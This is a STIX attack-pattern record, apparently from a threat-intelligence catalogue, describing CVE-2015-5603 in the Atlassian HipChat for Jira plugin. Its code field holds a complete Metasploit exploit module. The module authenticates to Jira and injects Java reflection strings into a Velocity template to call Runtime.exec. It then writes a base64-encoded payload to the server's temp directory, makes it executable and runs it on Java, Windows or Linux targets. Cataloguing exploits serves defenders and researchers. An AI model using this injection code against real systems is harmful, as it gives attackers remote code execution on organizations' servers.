{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4913b6af-a6fa-4fe2-8c7c-4b739b46049d",
    "created": "2024-08-14T17:08:06.005484Z",
    "modified": "2024-08-14T17:08:06.005488Z",
    "name": "\"Atlassian HipChat for Jira Plugin Velocity Template Injection\"",
    "description": " Atlassian Hipchat is a web service for internal instant messaging. A plugin is available for Jira that allows team collaboration at real time. A message can be used to inject Java code into a Velocity template, and gain code execution as Jira. Authentication is required to exploit this vulnerability, and you must make sure the account you're using isn't protected by captcha. By default, Java payload will be used because it is cross-platform but you can also specify which native payload you want (Linux or Windows).  HipChat for Jira plugin versions between 1.3.2 and 6.30.0 are affected. Jira versions between 6.3.5 and 6.4.10 are also affected by default, because they were bundled with a vulnerable copy of HipChat.  When using the check command, if you supply a valid username and password, the module will be able to trigger the bug and check more accurately. If not, it falls back to passive, which can only tell if the target is running on a Jira version that is bundled with a vulnerable copy of Hipchat by default, which is less reliable.  This vulnerability was originally discovered internally by Atlassian.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jira_hipchat_template.rb",
            "external_id": "jira_hipchat_template.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-5603"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/jira/jira-and-hipchat-for-jira-plugin-security-advisory-2015-08-26-776650785.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Atlassian HipChat for Jira Plugin Velocity Template Injection\",\n      'Description'    => %q{\n        Atlassian Hipchat is a web service for internal instant messaging. A plugin is available\n        for Jira that allows team collaboration at real time. A message can be used to inject Java\n        code into a Velocity template, and gain code execution as Jira. Authentication is required\n        to exploit this vulnerability, and you must make sure the account you're using isn't\n        protected by captcha. By default, Java payload will be used because it is cross-platform,\n        but you can also specify which native payload you want (Linux or Windows).\n\n        HipChat for Jira plugin versions between 1.3.2 and 6.30.0 are affected. Jira versions\n        between 6.3.5 and 6.4.10 are also affected by default, because they were bundled with\n        a vulnerable copy of HipChat.\n\n        When using the check command, if you supply a valid username and password, the module\n        will be able to trigger the bug and check more accurately. If not, it falls back to\n        passive, which can only tell if the target is running on a Jira version that is bundled\n        with a vulnerable copy of Hipchat by default, which is less reliable.\n\n        This vulnerability was originally discovered internally by Atlassian.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Chris Wood', # PoC\n          'sinn3r'      # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2015-5603' ],\n          [ 'EDB', '38551' ],\n          [ 'BID', '76698' ],\n          [ 'URL', 'https://confluence.atlassian.com/jira/jira-and-hipchat-for-jira-plugin-security-advisory-2015-08-26-776650785.html' ]\n        ],\n      'Targets'        =>\n        [\n          [ 'HipChat for Jira plugin on Java',    { 'Platform' => 'java',  'Arch' => ARCH_JAVA }],\n          [ 'HipChat for Jira plugin on Windows', { 'Platform' => 'win',   'Arch' => ARCH_X86  }],\n          [ 'HipChat for Jira plugin on Linux',   { 'Platform' => 'linux', 'Arch' => ARCH_X86  }]\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT' => 8080\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-10-28',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        # Auth is required, but when we use the check command we allow them to be optional.\n        OptString.new('JIRAUSER', [false, 'Jira Username', '']),\n        OptString.new('JIRAPASS', [false, 'Jira Password', '']),\n        OptString.new('TARGETURI', [true, 'The base to Jira', '/'])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n\n  # Returns a cookie in a hash, so you can ask for a specific parameter.\n  #\n  # @return [Hash]\n  def get_cookie_as_hash(cookie)\n    Hash[*cookie.scan(/\\s?([^, ;]+?)=([^, ;]*?)[;,]/).flatten]\n  end\n\n\n  # Checks the target by actually triggering the bug.\n  #\n  # @return [Array] Exploit::CheckCode::Vulnerable if bug was triggered.\n  #                 Exploit::CheckCode::Unknown if something failed.\n  #                 Exploit::CheckCode::Safe for the rest.\n  def do_explicit_check\n    begin\n      cookie = do_login\n      # I don't really care which command to execute, as long as it's a valid one for both platforms.\n      # If the command is valid, it should return {\"message\"=>\"0\"}.\n      # If the command is not valid, it should return an empty hash.\n      c = get_exec_code('whoami')\n      res = inject_template(c, cookie)\n      json = res.get_json_document\n      if json['message'] && json['message'] == '0'\n        return Exploit::CheckCode::Vulnerable\n      end\n    rescue Msf::Exploit::Failed => e\n      vprint_error(e.message)\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  # Returns the Jira version\n  #\n  # @return [String] Found Jira version\n  # @return [NilClass] No Jira version found.\n  def get_jira_version\n    version = nil\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'secure', 'Dashboard.jspa')\n    })\n\n    unless res\n      vprint_error('Connection timed out while retrieving the Jira version.')\n      return version\n    end\n\n    metas = res.get_html_meta_elements\n\n    version_element = metas.select { |m|\n      m.attributes['name'] && m.attributes['name'].value == 'ajs-version-number'\n    }.first\n\n    unless version_element\n      vprint_error('Unable to find the Jira version.')\n      return version\n    end\n\n    version_element.attributes['content'] ? version_element.attributes['content'].value : nil\n  end\n\n\n  # Checks the target by looking at things like the Jira version, or whether the Jira web app\n  # exists or not.\n  #\n  # @return [Array] Check code. If the Jira version matches the vulnerable range, it returns\n  #                 Exploit::CheckCode::Appears. If we can only tell it runs on Jira, we return\n  #                 Exploit::CheckCode::Detected, because it's possible to have Jira not bundled\n  #                 with HipChat by default, but installed separately. For other scenarios, we\n  #                 return Safe.\n  def do_passive_check\n    jira_version = get_jira_version\n    vprint_status(\"Found Jira version: #{jira_version}\")\n    if jira_version && jira_version >= '6.3.5' && jira_version < '6.4.11'\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  # Checks the vulnerability. Username and password are required to be able to accurately verify\n  # the vuln. If supplied, we will try the explicit check (which will trigger the bug, so should\n  # be more reliable). If not, we will try the passive one (less accurately, but better than\n  # nothing).\n  #\n  # @see #do_explicit_check\n  # @see #do_passive_check\n  #\n  # @return [Array] Check code\n  def check\n    checkcode = Exploit::CheckCode::Safe\n\n    if jira_cred_empty?\n      vprint_status(\"No username and password supplied, so we can only do a passive check.\")\n      checkcode = do_passive_check\n    else\n      checkcode = do_explicit_check\n    end\n\n    checkcode\n  end\n\n\n  # Returns the Jira username set by the user\n  def jira_username\n    datastore['JIRAUSER']\n  end\n\n\n  # Returns the Jira password set by the user\n  def jira_password\n    datastore['JIRAPASS']\n  end\n\n\n  def service_details\n      super.merge({ post_reference_name: self.refname })\n  end\n\n\n  # Returns a valid login cookie.\n  #\n  # @return [String]\n  def do_login\n    cookie = ''\n\n    prerequisites = get_login_prerequisites\n    xsrf          = prerequisites['atlassian.xsrf.token']\n    sid           = prerequisites['JSESSIONID']\n    uri           = normalize_uri(target_uri.path, 'rest', 'gadget', '1.0', 'login')\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => uri,\n      'headers'   => { 'X-Requested-With' => 'XMLHttpRequest' },\n      'cookie'    => \"atlassian.xsrf.token=#{xsrf}; JSESSIONID=#{sid}\",\n      'vars_post' => {\n        'os_username' => jira_username,\n        'os_password' => jira_password,\n        'os_captcha'  => '' # Not beatable yet\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while trying to login')\n    end\n\n    json = res.get_json_document\n\n    if json.empty?\n      fail_with(Failure::Unknown, 'Server returned a non-JSon response while trying to login.')\n    end\n\n    if json['loginSucceeded']\n      cookie = res.get_cookies\n    elsif !json['loginSucceeded'] && json['captchaFailure']\n      fail_with(Failure::NoAccess, \"#{jira_username} is protected by captcha. Please try a different account.\")\n    elsif !json['loginSucceeded']\n      fail_with(Failure::NoAccess, 'Incorrect username or password')\n    end\n\n    store_valid_credential(user: jira_username, private: jira_password, proof: cookie) # expands to store cookie\n\n    cookie\n  end\n\n\n  # Returns login prerequisites\n  #\n  # @return [Hash]\n  def get_login_prerequisites\n    uri = normalize_uri(target_uri.path, 'secure', 'Dashboard.jspa')\n    res = send_request_cgi({ 'uri' => uri })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while getting login prerequisites')\n    end\n\n    get_cookie_as_hash(res.get_cookies)\n  end\n\n\n  # Returns the target platform.\n  #\n  # @param cookie [String] Jira cookie\n  # @return [String]\n  def get_target_platform(cookie)\n    c = get_os_detection_code\n    res = inject_template(c, cookie)\n    json = res.get_json_document\n    json['message'] || ''\n  end\n\n\n  # Returns Java code that can be used to inject to the template in order to write a file.\n  #\n  # @note This Java code is not able to properly close the file handle. So after using it, you should use #get_dup_file_code,\n  #       and then execute the new file instead.\n  #\n  # @param fname [String] File to write to.\n  # @param p [String] Payload\n  # @return [String]\n  def get_write_file_code(fname, p)\n    b64 = Rex::Text.encode_base64(p)\n    %Q| $i18n.getClass().forName('java.io.FileOutputStream').getConstructor($i18n.getClass().forName('java.lang.String')).newInstance('#{fname}').write($i18n.getClass().forName('sun.misc.BASE64Decoder').getConstructor(null).newInstance(null).decodeBuffer('#{b64}')) |\n  end\n\n\n  # Returns the Java code that gives us the remote Java home path.\n  #\n  # @return [String]\n  def get_java_path_code\n    get_java_property_code('java.home')\n  end\n\n\n  # Returns the OS/platform information.\n  #\n  # @return [String]\n  def get_os_detection_code\n    get_java_property_code('os.name')\n  end\n\n\n  # Returns the temp path for Java.\n  #\n  # @return [String]\n  def get_temp_path_code\n    get_java_property_code('java.io.tmpdir')\n  end\n\n\n  # Returns a system property for Java.\n  #\n  # @param prop [String] Name of the property to retrieve.\n  # @return [String]\n  def get_java_property_code(prop)\n    %Q| $i18n.getClass().forName('java.lang.System').getMethod('getProperty', $i18n.getClass().forName('java.lang.String')).invoke(null, '#{prop}').toString() |\n  end\n\n\n  # Returns the Java code to execute a jar file.\n  #\n  # @param java_path [String] Java home path\n  # @param war_path [String] The jar file to execute\n  # @return [String]\n  def get_jar_exec_code(java_path, war_path)\n    # A quick way to check platform instead of actually grabbing os.name in Java system properties.\n    if /^\\/[[:print:]]+/ === war_path\n      normalized_java_path = Rex::FileUtils.normalize_unix_path(java_path, '/bin/java')\n      cmd_str = %Q|#{normalized_java_path} -jar #{war_path}|\n    else\n      normalized_java_path = Rex::FileUtils.normalize_win_path(java_path, '\\\\bin\\\\java.exe')\n      war_path.gsub!(/Program Files/, 'PROGRA~1')\n      cmd_str = %Q|cmd.exe /C #{normalized_java_path} -jar #{war_path}\"|\n    end\n\n    %Q| $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('#{cmd_str}').waitFor() |\n  end\n\n\n  # Returns Java code that can be used to inject to the template in order to execute a file.\n  #\n  # @param cmd [String] command to execute\n  # @return [String]\n  def get_exec_code(cmd)\n    %Q| $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('#{cmd}').waitFor() |\n  end\n\n\n  # Returns Java code that can be used to inject to the template in order to chmod a file.\n  #\n  # @param fname [String] File to chmod\n  # @return [String]\n  def get_chmod_code(fname)\n    get_exec_code(\"chmod 777 #{fname}\")\n  end\n\n\n  # Returns Java code that can be used to inject to the template in order to copy a file.\n  #\n  # @note The purpose of this method is to have a file that is not busy, so we can execute it.\n  #       It is meant to be used with #get_write_file_code.\n  #\n  # @param fname [String] The file to copy\n  # @param new_fname [String] The new file\n  # @return [String]\n  def get_dup_file_code(fname, new_fname)\n    if fname =~ /^\\/[[:print:]]+/\n      cp_cmd = \"cp #{fname} #{new_fname}\"\n    else\n      cp_cmd = \"cmd.exe /C copy #{fname} #{new_fname}\"\n    end\n\n    get_exec_code(cp_cmd)\n  end\n\n\n  # Returns a boolean indicating whether the module has a username and password.\n  #\n  # @return [TrueClass] There is an empty cred.\n  # @return [FalseClass] No empty cred.\n  def jira_cred_empty?\n    jira_username.blank? || jira_password.blank?\n  end\n\n\n  # Injects Java code to the template.\n  #\n  # @param p [String] Code that is being injected.\n  # @param cookie [String] A cookie that contains a valid JSESSIONID\n  # @return [void]\n  def inject_template(p, cookie)\n    login_sid = get_cookie_as_hash(cookie)['JSESSIONID']\n\n    uri  = normalize_uri(target_uri.path, 'rest', 'hipchat', 'integrations', '1.0', 'message', 'render')\n    uri << '/'\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => uri,\n      'cookie' => \"JSESSIONID=#{login_sid}\",\n      'ctype'  => 'application/json',\n      'data'   => { 'message' => p }.to_json\n    })\n\n    if !res\n      # This seems to trigger every time even though we're getting a shell. So let's downplay\n      # this a little bit. At least it's logged to allow the user to debug.\n      elog('Connection timed out in #inject_template')\n    elsif res && /Error report/ === res.body\n      print_error('Failed to inject and execute code:')\n      vprint_line(res.body)\n    elsif res\n      vprint_status(\"Server response:\")\n      vprint_line res.body\n    end\n\n    res\n  end\n\n\n  # Checks if the target os/platform is compatible with the module target or not.\n  #\n  # @return [TrueClass] Compatible\n  # @return [FalseClass] Not compatible\n  def target_platform_compat?(target_platform)\n    target.platform.names.each do |n|\n      if /^java$/i === n || /#{n}/i === target_platform\n        return true\n      end\n    end\n\n    false\n  end\n\n\n  # Returns the normalized file path for payload.\n  #\n  # @return [String]\n  def normalize_payload_fname(tmp_path, fname)\n    # A quick way to check platform insteaf of actually grabbing os.name in Java system properties.\n    if /^\\/[[:print:]]+/ === tmp_path\n      Rex::FileUtils.normalize_unix_path(tmp_path, fname)\n    else\n      Rex::FileUtils.normalize_win_path(tmp_path, fname)\n    end\n  end\n\n\n  # Returns a temp path from the remote target.\n  #\n  # @param cookie [String] Jira cookie\n  # @return [String]\n  def get_tmp_path(cookie)\n    c = get_temp_path_code\n    res = inject_template(c, cookie)\n    json = res.get_json_document\n    json['message'] || ''\n  end\n\n\n  # Returns the Java home path used by Jira.\n  #\n  # @param cookie [String] Jira cookie.\n  # @return [String]\n  def get_java_home_path(cookie)\n    c = get_java_path_code\n    res = inject_template(c, cookie)\n    json = res.get_json_document\n    json['message'] || ''\n  end\n\n\n  # Exploits the target in Java platform.\n  #\n  # @return [void]\n  def exploit_as_java(cookie)\n    tmp_path = get_tmp_path(cookie)\n\n    if tmp_path.blank?\n      fail_with(Failure::Unknown, 'Unable to get the temp path.')\n    end\n\n    jar_fname = normalize_payload_fname(tmp_path, \"#{Rex::Text.rand_text_alpha(5)}.jar\")\n    jar       = payload.encoded_jar\n    java_home = get_java_home_path(cookie)\n    register_files_for_cleanup(jar_fname)\n\n    if java_home.blank?\n      fail_with(Failure::Unknown, 'Unable to find java home path on the remote machine.')\n    else\n      print_status(\"Found Java home path: #{java_home}\")\n    end\n\n    print_status(\"Attempting to write #{jar_fname}\")\n    c = get_write_file_code(jar_fname, jar)\n    inject_template(c, cookie)\n\n    print_status(\"Executing #{jar_fname}\")\n    c = get_jar_exec_code(java_home, jar_fname)\n    inject_template(c, cookie)\n  end\n\n\n  # Exploits the target in Windows platform.\n  #\n  # @return [void]\n  def exploit_as_windows(cookie)\n    tmp_path = get_tmp_path(cookie)\n\n    if tmp_path.blank?\n      fail_with(Failure::Unknown, 'Unable to get the temp path.')\n    end\n\n    exe           = generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform)\n    exe_fname     = normalize_payload_fname(tmp_path,\"#{Rex::Text.rand_text_alpha(5)}.exe\")\n    exe_new_fname = normalize_payload_fname(tmp_path,\"#{Rex::Text.rand_text_alpha(5)}.exe\")\n    exe_fname.gsub!(/Program Files/, 'PROGRA~1')\n    exe_new_fname.gsub!(/Program Files/, 'PROGRA~1')\n    register_files_for_cleanup(exe_fname, exe_new_fname)\n\n    print_status(\"Attempting to write #{exe_fname}\")\n    c = get_write_file_code(exe_fname, exe)\n    inject_template(c, cookie)\n\n    print_status(\"New file will be #{exe_new_fname}\")\n    c = get_dup_file_code(exe_fname, exe_new_fname)\n    inject_template(c, cookie)\n\n    print_status(\"Executing #{exe_new_fname}\")\n    c = get_exec_code(exe_new_fname)\n    inject_template(c, cookie)\n  end\n\n\n  # Exploits the target in Linux platform.\n  #\n  # @return [void]\n  def exploit_as_linux(cookie)\n    tmp_path = get_tmp_path(cookie)\n\n    if tmp_path.blank?\n      fail_with(Failure::Unknown, 'Unable to get the temp path.')\n    end\n\n    fname = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(5))\n    new_fname = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(6))\n    register_files_for_cleanup(fname, new_fname)\n\n    print_status(\"Attempting to write #{fname}\")\n    p = generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform)\n    c = get_write_file_code(fname, p)\n    inject_template(c, cookie)\n\n    print_status(\"chmod +x #{fname}\")\n    c = get_exec_code(\"chmod 777 #{fname}\")\n    inject_template(c, cookie)\n\n    print_status(\"New file will be #{new_fname}\")\n    c = get_dup_file_code(fname, new_fname)\n    inject_template(c, cookie)\n\n    print_status(\"Executing #{new_fname}\")\n    c = get_exec_code(new_fname)\n    inject_template(c, cookie)\n  end\n\n\n  def exploit\n    if jira_cred_empty?\n      fail_with(Failure::BadConfig, 'Jira username and password are required.')\n    end\n\n    print_status(\"Attempting to login as #{jira_username}:#{jira_password}\")\n    cookie = do_login\n    print_good(\"Successfully logged in as #{jira_username}\")\n\n    target_platform = get_target_platform(cookie)\n    print_status(\"Target being detected as: #{target_platform}\")\n\n    unless target_platform_compat?(target_platform)\n      fail_with(Failure::BadConfig, 'Selected module target does not match the actual target.')\n    end\n\n    case target.name\n    when /java$/i\n      exploit_as_java(cookie)\n    when /windows$/i\n      exploit_as_windows(cookie)\n    when /linux$/i\n      exploit_as_linux(cookie)\n    end\n\n  end\n\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_good(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_error(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-10-28"
}